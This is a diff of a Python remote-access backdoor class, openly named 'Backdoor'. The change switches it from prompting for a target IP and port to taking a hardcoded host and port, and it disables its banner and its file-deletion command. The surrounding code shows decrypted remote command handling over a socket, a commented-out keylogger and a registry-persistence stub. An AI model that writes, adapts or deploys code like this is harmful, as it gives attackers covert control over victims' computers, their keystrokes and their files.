@@ -17,22 +17,19 @@ if sys.platform.startswith("Windows"):
 class Backdoor:
     keys_list = []
     count = 0
-    def __init__(self):
+    def __init__(self, host, port):
         # Font: Chuncky
 
-        # OBS: FOR DIRECT CONNECTION USE THIS FUNCTION BELOW AND DOWN IN THE CODE PUT Backdoor("ip",port)
+        self.host = str(host)
+        self.port = int(port)
 
-        # def __init__(self,host,port):
-            # self.host = str(host)
-            # self.port = int(port)
-
-        print("""\033[1;36m
- _______               __         __ __   
-|    ___|.--.--.-----.|  |.-----.|__|  |_ 
-|    ___||_   _|  _  ||  ||  _  ||  |   _|
-|_______||__.__|   __||__||_____||__|____|
-               |__|    \033[0;0m""")
-        try:
+        #print("""\033[1;36m
+# _______               __         __ __   
+#|    ___|.--.--.-----.|  |.-----.|__|  |_ 
+#|    ___||_   _|  _  ||  ||  _  ||  |   _|
+#|_______||__.__|   __||__||_____||__|____|
+               #|__|    \033[0;0m""")
+        """try:
             self.host = str(input("\033[1;36mPut here the Target's IP:\033[0;0m "))  # Comment this for using direct connection
             self.port = int(input("\033[1;36mPut here the RPORT:\033[0;0m "))  # Comment this for using direct connection
             if self.host == "":
@@ -45,7 +42,8 @@ class Backdoor:
         
         except:
             print("\nWrong Input! Exiting...")
-            sys.exit()
+            sys.exit()"""
+
     # OBS: THE 2 BELOW FUNCTIONS IS TO KEYLOGGER, BUT I CAN'T GARANTEE IF IT WILL WORK WITH LARGE RANGES, UNCOMMENT TO TRY IF YOU WANT
 
     """def keylogger(self, key):
@@ -249,7 +247,7 @@ class Backdoor:
 
                 # Remove files
                 
-                if message_command_descrypt.startswith("rm "):
+                """if message_command_descrypt.startswith("rm "):
                     try:
                         location = os.getcwd()
                         os.chdir(location)
@@ -259,7 +257,8 @@ class Backdoor:
                     #except Exception as e:
                         #self.sock.send(str(e).encode())
                     except:
-                        continue
+                        continue"""
+                                   
 
                 if message_command_descrypt == "rm":
                     self.sock.send("You must specify a file".encode())
@@ -283,6 +282,7 @@ class Backdoor:
 
             except KeyboardInterrupt:
                 print("\nExiting... Bye o/")
+                sys.exit()
             
             except ConnectionResetError:
                 print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Exiting...")
@@ -290,5 +290,5 @@ class Backdoor:
             #self.sock.close()
     def winreg(self,file, path):
         pass
-back = Backdoor() # Backdoor("ip",port)
+back = Backdoor("127.0.0.1",1) # Backdoor("ip",port)
 back.commands_initiating()
